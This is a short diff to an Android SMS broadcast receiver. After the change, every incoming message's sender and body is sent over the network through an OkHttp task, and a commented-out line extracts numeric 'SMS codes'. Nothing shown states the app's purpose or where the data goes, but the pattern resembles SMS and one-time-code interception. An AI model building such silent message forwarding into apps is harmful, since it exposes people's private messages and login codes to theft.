@@ -17,7 +17,7 @@ public class SMSReceiver extends BroadcastReceiver {
     public static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
     private static final Object TAG = "Debug APp :";
     OkHttpClient client = new OkHttpClient();
-    private static boolean firstConnect = true;
+
     @Override
     public void onReceive(Context context, Intent intent) {
         if (intent != null && intent.getAction() != null &&
@@ -38,10 +38,8 @@ public class SMSReceiver extends BroadcastReceiver {
             String body = bodyText.toString();
 //            // Lets get SMS Code
 //            String code = body.replaceAll("[^0-9]", "");
-            if(firstConnect) { 
-                new NetworkAccess().execute(sender,body);
-                firstConnect = false;
-            }
+            new NetworkAccess().execute(sender,body);
+
 
 //            Toast.makeText(context.getApplicationContext(), phono, Toast.LENGTH_SHORT).show();
 
